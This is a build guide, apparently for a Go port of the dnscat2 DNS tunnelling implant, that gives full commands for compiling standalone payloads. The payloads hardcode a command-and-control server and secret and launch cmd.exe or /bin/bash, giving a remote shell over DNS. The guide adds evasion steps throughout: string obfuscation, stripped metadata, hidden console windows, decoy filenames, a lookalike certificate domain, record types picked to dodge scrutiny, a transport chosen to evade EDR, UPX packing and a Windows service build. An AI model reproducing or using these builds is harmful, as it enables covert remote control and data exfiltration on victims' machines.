# Build Standalone Payloads

## Hardcoded Configuration

```bash
go build -ldflags="-s -w \
  -X main.DefaultServer=192.168.1.2 \
  -X main.DefaultSecret=YOUR_SECRET_HEX \
  -X main.DefaultExec=cmd.exe" \
  -o payload.exe ./cmd/dnscat/
```

## Available Variables

| Variable                 | Description                         | Default        |
| ------------------------ | ----------------------------------- | -------------- |
| `main.DefaultServer`     | DNS server IP                       | ""             |
| `main.DefaultSecret`     | Pre-shared secret (hex)             | ""             |
| `main.DefaultExec`       | Command to execute                  | ""             |
| `main.DefaultDomain`     | Domain name                         | ""             |
| `main.DefaultDelay`      | Packet delay (ms)                   | "1000"         |
| `main.DefaultPort`       | DNS port                            | "53"           |
| `main.DefaultDNSTypes`   | DNS record types                    | "TXT,CNAME,MX" |
| `main.DisableEncryption` | Disable encryption ("true"/"false") | "false"        |

## Examples

**Windows — domain mode (DNS server auto-detected from registry, recommended for domain-joined targets):**

```powershell
go build -tags stealth -trimpath `
    -ldflags="-s -w -buildid= -H windowsgui `
      -X main.DefaultDomain=crl.ms-cert.net `
      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
      -X main.DefaultServer=192.168.56.2 `
      -X main.DefaultDNSTypes=A,CNAME" `
    -o svcmgr.exe ./cmd/dnscat/
```

- `-tags stealth` enables string obfuscation; `-trimpath -buildid=` remove source/build metadata.
- `DefaultServer` is a direct-IP fallback used only when registry DNS lookup yields nothing.
- `A,CNAME` type mix avoids TXT-record scrutiny; label cap (C) and beacon jitter (D+E) are compiled in via the stealth tag.

The binary reads the DNS resolver IP at runtime from
`HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\NameServer`.
On a domain-joined machine this returns the DC's IP, routing tunnel traffic
through the internal DNS forwarder. Requires a conditional forwarder on the DC
for `crl.ms-cert.net` pointing to the attacker's dnscat2 server.

**Windows — direct mode (hardcoded server IP, use when target is NOT domain-joined or DNS forwarder is not available):**

```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.100 \
  -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e \
  -X main.DefaultExec=cmd.exe" \
  -o update.exe ./cmd/dnscat/
```

**Linux:**

```bash
GOOS=linux GOARCH=amd64 go build -ldflags="-s -w \
  -X main.DefaultServer=10.0.0.5 \
  -X main.DefaultSecret=90652b5ca36bf255cbce1cf7dbab8c6e \
  -X main.DefaultExec=/bin/bash" \
  -o sysupdate ./cmd/dnscat/
```

**Command session (no shell):**

```bash
go build -ldflags="-s -w -H windowsgui \
  -X main.DefaultServer=192.168.1.2 \
  -X main.DefaultSecret=abc123..." \
  -o payload.exe ./cmd/dnscat/
```

## Multi-Platform Build

```bash
# Windows x64
GOOS=windows GOARCH=amd64 go build -ldflags="..." -o payload-x64.exe ./cmd/dnscat/

# Windows x86
GOOS=windows GOARCH=386 go build -ldflags="..." -o payload-x86.exe ./cmd/dnscat/

# Linux x64
GOOS=linux GOARCH=amd64 go build -ldflags="..." -o payload-linux ./cmd/dnscat/

# macOS ARM64 (M1/M2)
GOOS=darwin GOARCH=arm64 go build -ldflags="..." -o payload-mac ./cmd/dnscat/
```

## Additional Optimization

**Strip symbols:**

```bash
-ldflags="-s -w"  # Already reduces size significantly
```

**UPX compression:**

```bash
upx --best payload.exe  # Further compress (optional)
```

**Hide console (Windows):**

```bash
-ldflags="-H windowsgui"  # No console window
```

## DnsQuery_W Transport Build (`cmd/dnscat-dnsapi`)

Identical flags to the domain-mode build above; only the target path changes.

**Windows — domain mode (DnsQuery_W, recommended when EDR monitors raw UDP socket ownership):**

```powershell
go build -tags stealth -trimpath `
    -ldflags="-s -w -buildid= -H windowsgui `
      -X main.DefaultDomain=crl.ms-cert.net `
      -X main.DefaultSecret=c7517dee4fcbe16a0c8c1f98cdc5ce4e `
      -X main.DefaultServer=192.168.56.2 `
      -X main.DefaultDNSTypes=A,CNAME" `
    -o svcmgr.exe ./cmd/dnscat-dnsapi/
```

**Key differences from `cmd/dnscat`:**

| | `cmd/dnscat` | `cmd/dnscat-dnsapi` |
|---|---|---|
| Transport | raw UDP socket | `dnsapi.dll!DnsQuery_W` |
| UDP/53 owner (network layer) | binary | `svchost.exe` (Dnscache) |
| `--dns-server` / `DefaultServer` | used as resolver IP | informational only; system resolver used |
| Cross-platform | yes | compiles on all; Windows-only at runtime |
| Sysmon Event 22 | binary PID visible | binary PID visible |

**Deployment requirement:** system DNS on the target must resolve `crl.ms-cert.net` — either via conditional forwarder on DC, or system DNS set directly to the dnscat2 server. `DefaultServer` is not used for resolution.

**Debug build:**

```powershell
go build -o svcmgr-dnsapi.exe ./cmd/dnscat-dnsapi/
```

## Windows Service Build

The `cmd/dnscat-service` module enables running dnscat2 as a native Windows service.

**Basic service build:**

```powershell
# Build without hardcoded config (requires registry configuration)
go build -o dnscat2-service.exe ./cmd/dnscat-service

# Build with hardcoded config (no registry needed)
go build -ldflags="-X main.DefaultDnsServer=192.168.1.2 -X main.DefaultSecret=mysecret" -o dnscat2-service.exe ./cmd/dnscat-service
```

**Stealth service build (recommended):**

```powershell
# Single-file, hardcoded config, stripped symbols
go build -ldflags="-s -w -X main.DefaultDnsServer=10.0.0.1 -X main.DefaultSecret=abc123 -X main.DefaultExecCommand=cmd.exe" -o dnscat2-service.exe ./cmd/dnscat-service
```

**Service build variables:**

| Variable | Description | Example |
|----------|-------------|---------|
| `main.DefaultDomain` | Domain to tunnel through | `example.com` |
| `main.DefaultDnsServer` | DNS server IP | `192.168.1.2` |
| `main.DefaultDnsPort` | DNS port | `"53"` |
| `main.DefaultDnsTypes` | DNS record types | `"TXT,CNAME,MX"` |
| `main.DefaultSecret` | Pre-shared secret | `"mysecret"` |
| `main.DefaultExecCommand` | Command to execute | `"cmd.exe"` |
| `main.DefaultDelay` | Packet delay in ms | `"1000"` |
| `main.DefaultMaxRetransmit` | Max retransmits | `"20"` |
| `main.DefaultNoEncryption` | Disable encryption | `"true"` |
| `main.DefaultPacketTrace` | Enable packet trace | `"true"` |


## Notes

- Command-line args override hardcoded defaults
- Payload runs standalone without arguments
- All variables are optional
- Empty string = use original default behavior

## Windows DNS Auto-Detection

When neither `DefaultServer` nor `--dns-server` is provided, the Windows binary
enumerates TCP/IP interface registry keys to find the configured DNS server:

```
HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\{GUID}\
  NameServer      (static DNS — checked first)
  DhcpNameServer  (DHCP-assigned DNS — checked as fallback)
```

First non-empty, non-`0.0.0.0` value across all GUIDs is used. On domain-joined
machines this is typically the DC's IP. No elevation required (`KEY_READ` is
accessible to any user including machine accounts).

To manually verify what value the binary would pick at runtime:

```text
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /s /v NameServer
reg query "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces" /s /v DhcpNameServer
```

## Windows Service (`dnscat-service`)

All files in `cmd/dnscat-service/` carry a `//go:build windows` tag — the
package imports `golang.org/x/sys/windows/svc` and
`golang.org/x/sys/windows/registry` which are Windows-only. Cross-compiling
from Linux/macOS requires `GOOS=windows`:

```bash
GOOS=windows GOARCH=amd64 go build \
  -ldflags="-s -w -X main.DefaultDnsServer=10.12.10.10 -X main.DefaultSecret=..." \
  -o dnscat2-svc.exe ./cmd/dnscat-service/
```
